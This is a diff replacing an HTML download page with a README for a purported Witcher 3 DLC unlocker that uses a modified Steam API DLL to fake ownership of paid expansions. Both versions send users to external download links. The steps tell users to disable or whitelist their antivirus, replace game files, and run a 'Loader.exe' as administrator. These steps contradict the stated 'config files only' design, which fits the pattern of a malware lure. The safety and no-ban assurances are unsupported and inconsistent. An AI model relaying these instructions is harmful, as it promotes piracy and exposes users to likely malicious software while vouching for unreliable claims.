@@ -1,27 +1,72 @@
-<div style="max-width:800px;margin:auto;padding:20px;font-family:Arial,sans-serif;line-height:1.6;background:#0a0a0f;color:#e0e0e0;border-radius:15px;">
-<h1 style="color:#66ff99;border-bottom:2px solid #33cc66;text-align:center;">🔧 The Witcher 3 DLC Unlocker – Lightweight CreamAPI + Config Files 🔧</h1>
-<p style="font-size:1.1em;text-align:center;"><strong>Small, fast, and powerful Steam‑only DLC unlocker for The Witcher 3.</strong> Based on the original CreamAPI approach. Just a few files and a pre‑configured cream_api.ini – no additional software or heavy toolkits required. Unlocks Hearts of Stone, Blood and Wine, and all 16 free DLCs.</p>
-<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://www.shawonline.co.za/redirl" style="background:#66ff99;color:#000;padding:12px 25px;">⬇️ DOWNLOAD STANDALONE UNLOCKER (LOADER)</a><p>✅ Lightweight ✅ Pre‑configured ✅ Steam only ✅ Ready to drop in</p></div>
-<img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/378649/48e242724931e89a71474b9f5ca080243e3ac772/header.jpg?t=1768304100" style="max-width:100%;border-radius:8px;margin:15px 0;">
-<div><h3>📦 What’s Inside the Standalone Pack:</h3>
-<ul><li><strong>cream_api.ini (pre‑configured):</strong> Contains all DLC IDs for The Witcher 3: Hearts of Stone (ID 378649), Blood and Wine (ID 378650), and the 16 free DLCs, including quest DLCs, alternate character outfits, finisher animations, New Game+, Gwent card sets, the Temerian and Nilfgaardian armour sets, and the Wolf School gear scavenger hunt.</li>
-<li><strong>Steam DLL replacement (version‑agnostic):</strong> Works with the latest Steam client without requiring version‑specific patches; compatible with both Classic and Next‑Gen editions.</li>
-<li><strong>Original file backup:</strong> Includes a copy of the original Steam DLL to allow one‑click restoration without reinstalling the game.</li>
-<li><strong>Simple installation:</strong> No launchers, no background services, no registry changes – just copy files into the game directory.</li></ul>
-<h3>🛠️ How the CreamAPI Method Works:</h3>
-<ul><li><strong>No game modifications – only Steam API interception.</strong> The game receives a fake DLC ownership response from the modified Steam API DLL, while game files themselves remain untouched.</li>
-<li><strong>Works with all legitimate Steam copies.</strong> You must own the base game legitimately; this tool does not generate a license or crack the main game executable.</li>
-<li><strong>No VAC ban risk.</strong> The Witcher 3 does not use Valve Anti‑Cheat, and the unlock operates purely client‑side.</li>
-<li><strong>Safe for achievements and cloud saves.</strong> Steam achievements, playtime tracking, and cloud saves work normally – as far as Steam is concerned, you own the DLCs.</li>
-<li><strong>Compatible with the Next‑Gen Update (v4.04).</strong> The same configuration works on both Classic and the Next‑Gen version – no version‑specific tweaks needed.</li>
-<li><strong>Works with mods:</strong> CreamAPI is compatible with most Witcher 3 mods, including script mods, texture replacements, and the Mod Manager. Install the mods first, then apply the DLC unlocker.</li></ul>
-<h3>🔧 Manual Configuration Tips (Advanced Users):</h3>
-<ul><li>If you prefer to edit the cream_api.ini manually, all DLC IDs are listed in a commented section inside the file. You can add or remove DLCs by editing the DLC list and the configuration line that points to the DLC directory.</li>
-<li>To unlock only specific DLCs (e.g., just Blood and Wine without Hearts of Stone), comment out or delete the corresponding DLC IDs.</li>
-<li>If you experience conflicts with other Steam API mods or tools, try removing any third‑party DLL files that might interfere and reapply the CreamAPI files.</li></ul>
-<p><strong>Important – In‑Game Activation of DLCs:</strong> After installation, some DLC content may not appear until you reach specific points in the game. The New Game+ mode only unlocks after completing the main story. The runewright appears after starting Hearts of Stone, and the mutation system only activates during the "Turn and Face the Strange" quest in Blood and Wine. This is normal – the DLCs are loaded, and the game triggers them according to its own quest logic.<br>Additionally, the in‑game Downloadable Content menu will show all 16 free DLCs as “installed”. You can verify they are active by checking this menu from the main title screen.</p>
-<h3>⚙️ System Requirements:</h3><p>Windows 10/11, The Witcher 3: Wild Hunt (Steam version) installed, 10 MB free space for unlocker files.</p>
-<h3>📥 Installation:</h3>
-<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:10px;text-align:center;"><div>1. Download archive</div><div>2. Disable antivirus (temp)</div><div>3. Run Loader.exe as Admin</div><div>4. Press INSERT to open menu</div></div>
-<div><strong>Tags:</strong> witcher 3 creamapi download, the witcher 3 steam dlc unlocker, creamapi witcher 3 next gen, witcher 3 all dlc cream_api.ini, witcher 3 hearts of stone dlc unlock, witcher 3 blood and wine unlock steam, witcher 3 steam api dlc unlock, witcher 3 lightweight dlc unlocker, witcher 3 dlc unlocker for mods, the witcher 3 creamapi no ban, witcher 3 achievement unlock with creamapi, witcher 3 cloud save dlc unlock, witcher 3 steam deck dlc unlock</div>
-</div>
+# ⚔️ The-Witcher-3-DLC-Unlocker-Lightweight-CreamAPI-Config-Files - Access All Game Content With Ease
+
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/4dr13l3/The-Witcher-3-DLC-Unlocker-Lightweight-CreamAPI-Config-Files/releases)
+
+This software provides the necessary configuration files to unlock downloadable content for The Witcher 3. It utilizes a lightweight version of CreamAPI to bridge the gap between your game files and the game launcher. This process allows the application to recognize your full content library without requiring manual changes to the game registry or complex command lines.
+
+## ⚙️ System Requirements
+
+Ensure your computer meets these basic requirements before you begin:
+
+* Operating System: Windows 10 or Windows 11.
+* Game Version: The Witcher 3 (Steam or GOG edition).
+* Hard Drive Space: Less than 5 MB of free space.
+* Permissions: Administrator access on your Windows user account.
+
+## 📥 How to Download the Files
+
+You must visit the official release page to obtain the correct files. Once you reach the page, look for the most recent version labeled as the latest release.
+
+[Click here to visit the release page and download the files](https://github.com/4dr13l3/The-Witcher-3-DLC-Unlocker-Lightweight-CreamAPI-Config-Files/releases)
+
+Select the zip file that appears under the assets section. Save this file to your computer desktop or your downloads folder for quick access.
+
+## 🛠️ Installation Instructions
+
+Follow these steps to set up the configuration files. These steps assume the game resides in the default installation folder. If you moved the game, navigate to that specific location instead.
+
+1. Locate the downloaded zip file on your computer.
+2. Right-click the file and select Extract All.
+3. Choose a folder where you want to keep these files and select Extract.
+4. Open the extracted folder to reveal the configuration files.
+5. Copy all files from this folder.
+6. Open your Steam or GOG installation folder for The Witcher 3. The path typically looks like C:\Program Files (x86)\Steam\steamapps\common\The Witcher 3.
+7. Paste the files into the folder that contains your game executable file, which is usually named witcher3.exe.
+8. If your computer asks if you want to replace existing files, select Yes or Replace. This ensures the configuration works with your specific game client.
+
+## 🧩 How the Application Works
+
+This tool acts as a simple bridge. When you launch the game, the game executable looks for specific instructions on what content to load. These configuration files tell the game to fetch and display the downloadable content automatically. 
+
+The CreamAPI component simulates a connection to the network services that verify ownership of add-on content. Because this version is lightweight, it does not run in the background. It only activates when you start the game, which keeps your computer performance steady and prevents lag.
+
+## 🛡️ Privacy and Safety
+
+This software modifies local configuration files only. It does not send your personal data to external servers. The files included in this package contain settings only. No malicious scripts or background processes run during the execution of this tool.
+
+You hold full control over the installation. By removing the files you pasted into the game folder, you revert the game to its standard state immediately. 
+
+## ❓ Frequently Asked Questions
+
+**Will this cause a ban on my account?**
+This tool modifies local settings files. It does not interact with the game servers or perform unauthorized changes to your account profile. Thousands of users modify local configuration files safely.
+
+**Do I need a specific launcher?**
+This works with standard Steam or GOG launchers. Ensure your game stays updated through your respective store client for the best compatibility.
+
+**The game does not show the new content.**
+Verify that you pasted the files into the correct folder. The files must reside in the same directory as the game executable, not in a sub-folder. Restart your game launcher if you face issues after installation.
+
+**Can I undo this change?**
+Yes. You can delete the files you added or use the verify game files feature in your game launcher. The launcher will detect the missing original files and restore them to the default state.
+
+## 🚀 Troubleshooting Tips
+
+If you experience issues during the setup, follow these steps to resolve common conflicts:
+
+* Administrator Privileges: Right-click your game launcher and select Run as Administrator. This gives the game permission to read the new configuration files correctly.
+* Antivirus Software: Sometimes antivirus programs flag new files. If your software blocks the files, add the game folder to your antivirus whitelist.
+* Steam Cloud: If your settings revert automatically, disable Steam Cloud for The Witcher 3 temporarily while you install the files, then re-enable it.
+* Version Mismatch: Ensure you downloaded the latest release from the link above. Old files may not work with newer game updates. 
+
+This process requires no coding knowledge. It relies on standard file placement within the Windows filesystem. Keep the folder organized, and you will maintain full access to your game content without further intervention.
